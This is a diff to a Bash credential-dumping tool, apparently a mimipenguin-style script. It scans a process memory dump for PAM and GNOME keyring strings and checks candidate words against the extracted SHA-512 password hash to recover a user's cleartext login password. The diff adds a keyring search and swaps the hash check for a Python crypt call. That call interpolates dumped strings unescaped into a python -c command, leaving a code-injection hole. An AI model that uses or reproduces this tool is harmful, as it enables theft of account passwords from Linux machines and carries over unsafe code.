@@ -20,6 +20,7 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
 	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
 	SALT="$(echo $HASH | cut -d'$' -f 3)"
 	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
+	DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
 fi
 
 #If Ubuntu
@@ -36,12 +37,18 @@ fi
 echo "Password located somewhere below:"
 echo "Word,PasswordPotential"
 
+#If hash, print it
 if [[ $HASH ]]; then
 	echo "$HASH,HASH"
 fi
 
 #Determine password potential for each word
 while read -r line; do
+	#if hash, prepare crypt line
+	if [[ $HASH ]]; then
+		CRYPT="\"$line\", \"\$6\$$SALT\""
+	fi
+	
 	if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
 		echo "$line,LOW"
 	elif [[ $line =~ ^LOGNAME= ]]; then
@@ -60,7 +67,7 @@ while read -r line; do
 		echo "$line,LOW"
 	elif [[ $line =~ \/bin ]]; then
 		echo "$line,LOW"
-	elif [[ `mkpasswd -m "sha-512" -S $SALT -s <<< $line` == $HASH ]]; then
+	elif [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $HASH ]]; then
 		echo "$line,HIGH"
 	else
 		echo "$line,MEDIUM"
